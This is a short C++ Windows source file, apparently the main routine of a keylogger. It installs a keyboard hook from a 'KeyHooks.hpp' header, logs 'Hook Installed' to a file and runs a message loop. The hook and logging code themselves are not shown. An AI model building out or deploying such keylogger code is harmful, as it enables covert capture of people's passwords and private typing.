#include <windows.h>
#include "KeyHooks.hpp"

int main() {
	MSG msg;
	Insight::InstalHook();
	Insight::MiniLogger::writeToLogFile("\nHook Installed\n");
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	Insight::log_timer.Stop();
	return 0;
}